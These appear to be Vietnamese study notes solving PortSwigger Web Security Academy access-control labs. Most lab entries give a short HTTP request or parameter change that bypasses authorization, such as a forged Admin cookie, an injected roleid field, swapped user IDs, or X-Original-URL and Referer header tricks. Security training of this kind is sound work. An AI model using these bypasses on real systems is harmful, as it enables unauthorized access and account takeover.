# Access control vulnerabilities and privilege escalation
Trong phần này, chúng tôi mô tả:
- Leo thang đặc quyền.
- Các loại lỗ hổng có thể phát sinh với kiểm soát truy cập(access control).
- Làm thế nào để ngăn chặn các lỗ hổng kiểm soát truy cập.


## lab

logic:

- directly access admin panel by normal user account
- directly access admin panel with unpredictable URL by normal user account
- role controlled by request parameters (cookies, ...)
- edit update account information request (add role field in a change email request, ...)
- change userid in request
- find unpredictable userid
- check redirect response
- check idor
- X-Original-URL
- change method of unauthorized request (POST -> GET)
- check multi-step process
- fake refered header

### Lab: Unprotected admin functionality

Xuất hiện: `/robots.txt`: Disallow line -> admin panel.

Từ đó vào: `/administrator-panel`: Delete carlos.

### Lab: Unprotected admin functionality with unpredictable URL

Lộ code:

```js
var isAdmin = false;
if (isAdmin) {
   var topLinksTag = document.getElementsByClassName("top-links")[0];
   var adminPanelTag = document.createElement('a');
   adminPanelTag.setAttribute('href', '/admin-8krsd4');
   adminPanelTag.innerText = 'Admin panel';
   topLinksTag.append(adminPanelTag);
   var pTag = document.createElement('p');
   pTag.innerText = '|';
   topLinksTag.appendChild(pTag);
}
```

Từ đó vào: `GET /admin-8krsd4/delete?username=carlos HTTP/1.1`

### Lab: User role controlled by request parameter

Cookie có thể sửa từ phía client

```http
GET /admin/delete?username=carlos HTTP/1.1
Host: id.web-security-academy.net
Cookie: Admin=true; session=PBGX9cSFeB9Eo2SIowHHg3QCVHGbL4wn
```

### Lab: User role can be modified in user profile

Thay id admin trong request:

```
{"email":"test@test.test", "roleid":2}
```

### Lab: User ID controlled by request parameter

Thay `carlos` trên URL:

`https://id.web-security-academy.net/my-account?id=carlos`

### Lab: User ID controlled by request parameter, with unpredictable user IDs

Lộ id carlos trong bài viết

`https://id.web-security-academy.net/my-account?id=80bf4a7b-e7f6-4d28-af58-135a2595fe8d`

### Lab: User ID controlled by request parameter with data leakage in redirect

Khi thay `carlos` trên URL nó tự chuyển 302 về `login` nhưng trong response trả về 302 lại có thông tin carlos

```html
HTTP/1.1 302 Found
Location: /login
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
Connection: close
Content-Length: 3395

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>User ID controlled by request parameter with data leakage in redirect</title>
...
        <div id=account-content>
        <p>Your username is: carlos</p>
        <div>Your API Key is: sMctlBUitcILqisWH7l38Ami24XjlesY</div>    
```

### Lab: User ID controlled by request parameter with password disclosure

Password bị lộ ở html (hidden)

```html
<form class="login-form" action="/my-account/change-password" method="POST">
  <br>
  <label>Password</label>
  <input required="" type="hidden" name="csrf" value="u9ah9Jib6PtthNaJehbkBmqJ5Dae4AjM">
  <input required="" type="password" name="password" value="ls7hgceacoropfh8w2m8">
  <button class="button" type="submit"> Update password </button>
</form>
```

### Lab: Insecure direct object references

Chat box lộ password

### Lab: URL-based access control can be circumvented

Thêm header `X-Original-URL`

```http
GET /?username=carlos HTTP/1.1
X-Original-URL: /admin/delete
```

### Lab: Method-based access control can be circumvented

Thêm parameter thì sẽ ko bị redirect 

```http
GET /admin-roles?wiener&action=upgrade HTTP/1.1
Cookie: session=wienersession
```

### Lab: Referer-based access control

Thêm referer:

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Cookie: session=wienersession
Referer: https://id.web-security-academy.net/admin
```
































